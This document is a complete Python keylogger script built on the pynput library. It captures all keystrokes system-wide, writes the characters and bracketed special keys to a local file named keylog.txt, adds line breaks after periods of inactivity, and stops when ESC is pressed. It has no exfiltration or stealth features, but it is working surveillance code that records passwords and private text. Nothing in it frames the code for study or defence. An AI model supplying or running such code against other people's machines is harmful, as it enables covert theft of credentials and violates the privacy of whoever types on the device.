from pynput import keyboard
import time
import threading

# Specify the log file
log_file = "keylog.txt"

# Initialize variables
last_key_time = time.time()  # Track the last time a key was pressed
inactive_duration = 3  # Inactivity duration in seconds
new_line_pending = False  # Flag to track if a new line should be added

# Function to log key presses
def on_press(key):
    global last_key_time, new_line_pending

    # Check if a new line should be added due to inactivity
    if new_line_pending:
        log_key("\n")  # Move to the next line
        new_line_pending = False  # Reset the flag

    # Update the last key time on any key press
    last_key_time = time.time()

    try:
        # Get the character representation of the key
        if hasattr(key, 'char') and key.char is not None:
            log_key(key.char)  # Log regular characters
        else:
            # Handle special keys
            if key == keyboard.Key.enter:
                log_key("\n")  # Move to the next line on Enter
            elif key == keyboard.Key.space:
                log_key(" ")  # Log space as a space character
            elif key == keyboard.Key.backspace:
                log_key("[back] ")  # Log backspace as [back]
            elif key == keyboard.Key.esc:
                log_key("[esc] ")  # Log ESC as [esc]
            elif key in (keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right):
                pass  # Ignore arrow keys
            else:
                # For other special keys, log them in brackets
                log_key(f"[{key.name}] ")

    except AttributeError:
        # Handle any attribute errors gracefully
        pass

def log_key(key_str):
    # Log the key to the file
    with open(log_file, "a") as f:
        f.write(key_str)

# Function to handle key release
def on_release(key):
    if key == keyboard.Key.esc:  # Press ESC to stop the keylogger
        return False

# Background function to check for inactivity
def check_inactivity():
    global last_key_time, new_line_pending
    while True:
        current_time = time.time()
        if current_time - last_key_time > inactive_duration:
            new_line_pending = True  # Flag to add a new line when the next key is pressed
        time.sleep(1)  # Check every second

# Start the inactivity check in a separate thread
inactivity_thread = threading.Thread(target=check_inactivity)
inactivity_thread.daemon = True  # Make sure the thread exits when the main program does
inactivity_thread.start()

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
